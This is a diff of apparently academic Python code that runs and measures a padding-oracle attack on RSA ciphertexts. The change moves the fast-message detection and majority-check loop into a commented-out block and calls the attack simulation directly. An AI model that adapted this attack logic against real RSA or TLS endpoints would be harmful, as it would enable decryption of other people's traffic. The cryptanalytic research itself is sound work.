@@ -658,78 +658,21 @@ def meddler(attack_values, s_start_after =0, is_calibration = False, is_second_o
         modifier_outfile.write(str(c0))
         modifier_outfile.flush()
         
-        
-        res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after, 5000)#600)#600)00)#1000)#1010)
-        modifier_outfile.write("Fast Detection return result: %s\n" %(res, ))
-        #set_trace()
-        if not res[2]:
-            modifier_outfile.write("\nFound possible fast - starting majority check")
-            modifier_outfile.write(str(time.time()))
-            modifier_outfile.write(str(c0))
-            modifier_outfile.flush()
-            print("\nFound possible fast - starting majority check")
-            print(time.time())
-            print(str(c0))
-            check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
-            firstmul = res[1]
-            possible = []
-            for i in range(4):
-                resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
-                
-                possible.append(resss)
-            modifier_outfile.write("\nPerformed majority check for msg %s\n" %(str(possible), ))
-            modifier_outfile.write(str(m0))
-            modifier_outfile.flush()
-            if (possible.count(0) > 2):
-                count_false_positive +=1
-                to_write = "Failed with false positive continuing search\n"
-                to_write+= str(c0)+"\n"
-                res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after+firstmul, 5000-firstmul)#200-firstmul)#600-firstmul)#1000)#1010)
-                if res[2]:
-                    continue
-                else:
-                    check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
-                    firstmul = res[1]
-                    possible = []
-                    for i in range(4):
-                        resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
-                        
-                        possible.append(resss)
-                    modifier_outfile.write("\nPerformed majority check again for msg %s\n" %(str(possible), ))
-                    modifier_outfile.write(str(c0))
-                    if (possible.count(0) > 2):
-                        count_not_fast +=1
-                        modifier_outfile.write("Reached query limit - not fast\n" )
-                        continue
-            print("found fast")
-            qtill_fast+= (firstmul+4)
-            till_fast_list.append(till_fast)
-            modifier_outfile.write("\nFound fast message %d after %d, %s\n" %(count_fast+1, till_fast, str(till_fast_list), ))  
-            modifier_outfile.flush()
-            till_fast=0
-            qtill_fast_list.append(qtill_fast)
-            qtill_fast = 0
-            #count_fast += 1#, withExternalAndComparisonNoWait=True
-            #padding_oracle_ext_with_comparison2 =  my_attack_sim.PaddingOracleAnyLength(onCT=False, externalOracleCall=prob_oracle1, onExternal=True, withVal=True)
+       
+            #count_fast +=1
+        to_write = ""#"Detected a fast token\n" + str(time.time()-before)+ 
+        #modifier_outfile.write("Detected a fast token\n")
+        modifier_outfile.write(str(time.time()-before))
+        modifier_outfile.write("Running attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))
+        res = my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_ext_with_comparison, from_diff=from_diff, fromdiffab=fromdiffab, fromlastri=fromlastri, until_diff=until_diff, s_start = s_min+s_start_after)#+firstmul-3)#28)#29)
+        if res:
+            print(res)
 
-            #padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
-            #if not resss:
-                            
-               
-            count_fast +=1
-            to_write = ""#"Detected a fast token\n" + str(time.time()-before)+ 
-            #modifier_outfile.write("Detected a fast token\n")
-            modifier_outfile.write(str(time.time()-before))
-            modifier_outfile.write("Running attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))
-            res = my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_ext_with_comparison, from_diff=from_diff, fromdiffab=fromdiffab, fromlastri=fromlastri, until_diff=until_diff, s_start = s_min+s_start_after+firstmul-3)#28)#29)
-            if res:
-                print(res)
-
-            modifier_outfile.write("Attack return result: %s\n" %(res, ))
-            modifier_outfile.write(str(padding_oracle_ext_with_comparison.qcount) +" queries and first multiplier at %d\n" %(firstmul, ))
-            modifier_outfile.flush()
-            fast_msgs_queries.append(padding_oracle_ext_with_comparison.qcount)
-            output_test_results(modifier_outfile, padding_oracle_ext_with_comparison, res)
+        modifier_outfile.write("Attack return result: %s\n" %(res, ))
+        modifier_outfile.write(str(padding_oracle_ext_with_comparison.qcount) +" queries and first multiplier at %d\n" %(firstmul, ))
+        modifier_outfile.flush()
+        fast_msgs_queries.append(padding_oracle_ext_with_comparison.qcount)
+        output_test_results(modifier_outfile, padding_oracle_ext_with_comparison, res)
         # else:
             # count_not_fast +=1
             # modifier_outfile.write("Reached query limit - not fast\n" )
@@ -762,7 +705,62 @@ def meddler(attack_values, s_start_after =0, is_calibration = False, is_second_o
     mal.close()
 
 
-    
+    """
+        res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after, 5000)#600)#600)00)#1000)#1010)
+        modifier_outfile.write("Fast Detection return result: %s\n" %(res, ))
+        #set_trace()
+        if not res[2]:
+            modifier_outfile.write("\nFound possible fast - starting majority check")
+            modifier_outfile.write(str(time.time()))
+            modifier_outfile.write(str(c0))
+            modifier_outfile.flush()
+            print("\nFound possible fast - starting majority check")
+            print(time.time())
+            print(str(c0))
+            check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
+            firstmul = res[1]
+            possible = []
+            for i in range(4):
+                resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
+                
+                possible.append(resss)
+            modifier_outfile.write("\nPerformed majority check for msg %s\n" %(str(possible), ))
+            modifier_outfile.write(str(m0))
+            modifier_outfile.flush()
+            if (possible.count(0) > 2):
+                count_false_positive +=1
+                to_write = "Failed with false positive continuing search\n"
+                to_write+= str(c0)+"\n"
+                res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after+firstmul, 5000-firstmul)#200-firstmul)#600-firstmul)#1000)#1010)
+                if not res[2]:
+                    check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
+                    firstmul = res[1]
+                    possible = []
+                    for i in range(4):
+                        resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
+                        
+                        possible.append(resss)
+                    modifier_outfile.write("\nPerformed majority check again for msg %s\n" %(str(possible), ))
+                    modifier_outfile.write(str(c0))
+                    if (possible.count(0) > 2):
+                        count_not_fast +=1
+                        modifier_outfile.write("Reached query limit - not fast\n" )
+                        continue
+            print("found fast")
+            qtill_fast+= (firstmul+4)
+            till_fast_list.append(till_fast)
+            modifier_outfile.write("\nFound fast message %d after %d, %s\n" %(count_fast+1, till_fast, str(till_fast_list), ))  
+            modifier_outfile.flush()
+            till_fast=0
+            qtill_fast_list.append(qtill_fast)
+            qtill_fast = 0
+            #count_fast += 1#, withExternalAndComparisonNoWait=True
+            #padding_oracle_ext_with_comparison2 =  my_attack_sim.PaddingOracleAnyLength(onCT=False, externalOracleCall=prob_oracle1, onExternal=True, withVal=True)
+
+            #padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
+            #if not resss:
+    """                
+               
 
 RSA_seq_nums = []
 PKASPkt_list = []
